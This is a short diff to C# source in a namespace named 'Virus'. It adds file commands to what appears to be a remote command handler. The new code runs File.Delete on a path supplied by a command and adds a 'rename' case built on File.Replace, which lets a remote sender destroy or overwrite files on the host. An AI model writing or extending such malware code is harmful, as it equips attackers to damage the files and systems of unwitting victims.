@@ -33,7 +33,10 @@ namespace Virus
                         stream.Close();
                         break;
                     case "delete":
-
+                        File.Delete(command[1]);
+                        break;
+                    case "rename":
+                        File.Replace(command[1],command[2],"");
                         break;
                     default:
                         break;
